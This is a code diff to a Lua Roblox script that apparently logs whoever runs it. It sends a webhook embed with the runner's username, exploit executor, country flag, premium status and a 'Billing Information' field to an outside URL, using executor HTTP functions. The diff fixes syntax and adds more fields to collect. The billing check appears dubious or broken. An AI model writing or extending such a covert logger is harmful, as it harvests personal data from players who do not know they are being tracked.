@@ -24,7 +24,7 @@ local countryFlagURL = "https://www.countryflags.io/" .. countryCode .. "/flat/6
 
 -- Create an embed for the webhook
 local embedData = {
-    ["title"] = "__**" .. game.Players..Name .. " Has Executed Your Script!**__"
+    ["title"] = "__**" .. game.Players.LocalPlayer.Name .. " Has Executed Your Script!**__",
     ["description"] = "Username: " .. game.Players.LocalPlayer.Name .. " Using **" .. exploitCheck .. "**",
     ["type"] = "rich",
     ["color"] = tonumber(0x7269da),
@@ -51,7 +51,17 @@ local embedData = {
         {
             ["name"] = "Country Flag",
             ["value"] = "[![Flag](" .. countryFlagURL .. ")](" .. countryFlagURL .. ")",
-            ["inline"{ = true
+            ["inline"] = true
+        },
+        {
+            ["name"] = "Premium Subscription",
+            ["value"] = game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Yes" or "No",
+            ["inline"] = true
+        },
+        {
+            ["name"] = "Billing Information",
+            ["value"] = game.Players.LocalPlayer.BillingFlag == Enum.BillingFlag.HasBC or "None",
+            ["inline"] = true
         }
     }
 }
@@ -71,12 +81,12 @@ local headers = {
 local httpService = game:GetService("HttpService")
 local request = http_request or request or HttpPost or syn.request
     
-local DataToRequest({
+local DataToRequest = {
     Url = url,
     Body = game:GetService("HttpService"):JSONEncode(data),
     Method = "POST",
     Headers = headers
-})
+}
 
 request(DataToRequest)
     
